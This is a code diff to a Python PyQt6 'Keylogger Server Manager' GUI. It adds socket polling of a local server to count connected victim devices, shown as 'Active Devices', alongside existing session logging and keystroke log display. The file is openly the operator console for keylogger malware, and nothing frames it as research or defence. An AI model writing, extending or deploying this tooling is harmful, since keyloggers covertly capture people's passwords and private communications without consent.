@@ -1,11 +1,12 @@
 """
-Keylogger Server Manager - Main Interface with Session ID
+Keylogger Server Manager - Main Interface with Session ID and Connection Tracking
 """
 
 import sys
 import datetime
 import json
 import os
+import socket
 from PyQt6.QtWidgets import (
     QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QHBoxLayout,
     QTextEdit, QGridLayout, QGroupBox, QFileDialog, QMessageBox, QDialog
@@ -35,6 +36,9 @@ class KeyloggerServerGUI(QWidget):
         self.last_log_size = 0
         self.session_id = None  # Track current session ID
         
+        # Connection stats - only active connections
+        self.active_connections = 0
+        
         # Load settings
         self.settings = self.load_settings_from_file()
         
@@ -59,6 +63,11 @@ class KeyloggerServerGUI(QWidget):
         self.log_timer = QTimer()
         self.log_timer.timeout.connect(self.load_logs)
         self.log_timer.start(2000)
+        
+        # Stats timer (fetch connection stats every 3 seconds when server is running)
+        self.stats_timer = QTimer()
+        self.stats_timer.timeout.connect(self.fetch_connection_stats)
+        self.stats_timer.start(3000)
         
         # Styling
         self.apply_styles()
@@ -117,12 +126,12 @@ class KeyloggerServerGUI(QWidget):
         card1.setLayout(v1)
         grid.addWidget(card1, 0, 0)
         
-        # Card 2
-        self.total_connections_label = QLabel("0")
-        card2 = QGroupBox("Connections")
+        # Card 2 - Simplified to show only active connections
+        self.active_connections_label = QLabel("0")
+        card2 = QGroupBox("Active Devices")
         v2 = QVBoxLayout()
-        v2.addWidget(QLabel("Total Received:"))
-        v2.addWidget(self.total_connections_label)
+        v2.addWidget(QLabel("Connected:"))
+        v2.addWidget(self.active_connections_label)
         card2.setLayout(v2)
         grid.addWidget(card2, 0, 1)
         
@@ -214,6 +223,37 @@ class KeyloggerServerGUI(QWidget):
             }
         """)
 
+    # ==================== CONNECTION STATS ====================
+    
+    def fetch_connection_stats(self):
+        """Fetch connection statistics from server."""
+        if not self.server_running:
+            return
+        
+        try:
+            # Connect to server and request stats
+            s = socket.socket()
+            s.settimeout(2)
+            s.connect(("localhost", self.settings['server_port']))
+            
+            # Send stats request
+            s.send(b'S')
+            
+            # Receive stats
+            stats_data = s.recv(4096).decode('utf-8')
+            s.close()
+            
+            # Parse stats
+            stats = json.loads(stats_data)
+            self.active_connections = stats.get('active_count', 0)
+            
+            # Update UI
+            self.active_connections_label.setText(str(self.active_connections))
+            
+        except Exception as e:
+            # Silently fail if server is not responding
+            pass
+
     # ==================== SETTINGS ====================
     
     def open_settings(self):
@@ -246,6 +286,10 @@ class KeyloggerServerGUI(QWidget):
             self.session_id_label.setText(f"Session: {self.session_id}")  # Show full ID now
             self.start_btn.setEnabled(False)
             self.stop_btn.setEnabled(True)
+            
+            # Reset connection counter
+            self.active_connections = 0
+            self.active_connections_label.setText("0")
             
             # Write session start to log
             self.write_session_log(f"=== SERVER SESSION STARTED: {self.session_id} ===")
@@ -300,6 +344,9 @@ class KeyloggerServerGUI(QWidget):
                 self.session_id = None
                 self.start_btn.setEnabled(True)
                 self.stop_btn.setEnabled(False)
+                
+                # Reset connection display
+                self.active_connections_label.setText("0")
             else:
                 QMessageBox.critical(self, "Error", f"Failed to stop: {error}")
 
